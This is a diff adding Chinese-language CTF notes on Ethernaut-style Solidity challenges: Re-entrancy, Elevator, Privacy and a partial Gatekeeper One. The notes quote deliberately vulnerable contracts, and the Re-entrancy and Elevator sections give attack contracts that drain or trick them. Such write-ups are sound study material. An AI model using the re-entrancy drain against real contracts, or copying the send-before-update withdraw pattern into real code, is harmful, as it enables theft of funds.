@@ -132,11 +132,192 @@ contract Hack {
 
 ## Re-entrancy
 
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.12;
 
-## 
+import "@openzeppelin/contracts/math/SafeMath.sol";
 
-## 
+contract Reentrance {
+  
+  using SafeMath for uint256;
+  mapping(address => uint) public balances;
 
-## 
+  function donate(address _to) public payable {
+    balances[_to] = balances[_to].add(msg.value);
+  }
 
-## 
+  function balanceOf(address _who) public view returns (uint balance) {
+    return balances[_who];
+  }
+
+  function withdraw(uint _amount) public {
+    if(balances[msg.sender] >= _amount) {
+      (bool result,) = msg.sender.call{value:_amount}("");
+      if(result) {
+        _amount;
+      }
+      balances[msg.sender] -= _amount;
+    }
+  }
+
+  receive() external payable {}
+}
+```
+
+重入攻击，可以发现 `withdraw` 中直接调用的 `msg.sender.call{value:_amount}("")` 并且是先转账再改变状态，所以可以在转账的时候再次调用 `withdraw` 达到重入的效果。
+
+```js
+contract Hack {
+    
+    Reentrance r;
+    uint cnt;
+
+    constructor(address payable ch) public payable {
+        r = Reentrance(ch);
+        cnt = 1;
+    }
+
+    function step1() public payable {
+        r.donate{value: 0.001 ether}(address(this));
+    }
+
+    function step2() public payable {
+        r.withdraw(0.001 ether);
+    }
+    
+    receive() external payable {
+        if (cnt == 1) {
+            r.withdraw(0.001 ether);
+            cnt += 1;
+        }
+    }
+}
+```
+
+## Elevator
+
+意思挺简单的，就是让一个函数第一次返回 false 第二次返回 true:
+```js
+if (! building.isLastFloor(_floor)) {
+  floor = _floor;
+  top = building.isLastFloor(floor);
+}
+```
+
+hack 合约
+
+```js
+contract Hack {
+    
+    Elevator e;
+    bool top;
+
+    constructor(address addr) {
+        e = Elevator(addr);
+        top = true;
+    }
+
+    function hack() public {
+        e.goTo(100);
+    }
+
+    function isLastFloor(uint _floor) external returns (bool) {
+        top = !top;
+        return top;
+    }
+}
+```
+
+## Privacy
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Privacy {
+
+  bool public locked = true;
+  uint256 public ID = block.timestamp;
+  uint8 private flattening = 10;
+  uint8 private denomination = 255;
+  uint16 private awkwardness = uint16(block.timestamp);
+  bytes32[3] private data;
+
+  constructor(bytes32[3] memory _data) {
+    data = _data;
+  }
+  
+  function unlock(bytes16 _key) public {
+    require(_key == bytes16(data[2]));
+    locked = false;
+  }
+
+  /*
+    A bunch of super advanced solidity algorithms...
+
+      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
+      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
+      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
+      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
+      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
+  */
+}
+```
+
+这里考了 solidity storage 的布局以及 arg encoding。具体内容可以参考 [ctf-wiki](https://ctf-wiki.org/blockchain/ethereum/storage/) 进行学习。
+
+可以知道 key 在 `slot[5]` 并且对于 byte32 取 byte16 即相当于取它的前 16 个字节。
+
+![](https://cdn.silente.top/img/202307082032197.png)
+
+## Gatekeeper One
+
+有三个限制，一个一个来看。
+
+首先是 `gateOne`：
+
+```js
+modifier gateOne() {
+  require(msg.sender != tx.origin);
+  _;
+}
+```
+直接用合约调用就行。
+
+```js
+modifier gateTwo() {
+  require(gasleft() % 8191 == 0);
+  _;
+}
+```
+
+这里涉及到 solidity gas fee 的计算，它是跟 opcode 绑定的，当然这里我们可以直接在 remix 里断点调试拿到 gasleft 那时候的值，然后自己再修改 gas：
+
+![](https://cdn.silente.top/img/202307082200814.png)
+
+可以看到通过调试跟进，修改 gas 后栈上的两个值相同，都是 0x1fff。
+
+```js
+modifier gateThree(bytes8 _gateKey) {
+    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+    require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+    require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
+  _;
+}
+```
+
+第三个好绕，读懂发现需要满足：
+
+- gateKey 的 33-48 位为 0
+- gateKey 的前 32 位不全为 0
+- gateKey 的后 16 位等于 tx.origin 的后 16 位
+
+然后就能走进 enter 函数：
+
+![](https://cdn.silente.top/img/202307082313589.png)
+
+不过不知道什么问题一直在 `entrant = tx.origin;` 这里 revert emmm
+
+
+## TODO
